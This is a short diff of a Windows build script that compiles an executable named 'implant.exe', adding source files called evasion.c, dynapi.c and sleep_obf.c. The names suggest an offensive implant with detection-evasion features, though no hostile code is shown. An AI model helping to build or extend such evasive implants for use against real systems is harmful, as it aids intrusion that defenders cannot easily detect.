@@ -44,10 +44,14 @@ cl.exe /O2 /MT /W3 /D_CRT_SECURE_NO_WARNINGS /Fe:build\implant.exe ^
     src\files.c ^
     src\process.c ^
     src\utils.c ^
+    src\evasion.c ^
+    src\dynapi.c ^
+    src\sleep_obf.c ^
     /link ^
     winhttp.lib ^
     advapi32.lib ^
     user32.lib ^
+    shell32.lib ^
     /SUBSYSTEM:WINDOWS /ENTRY:mainCRTStartup
 
 if %errorlevel% equ 0 (
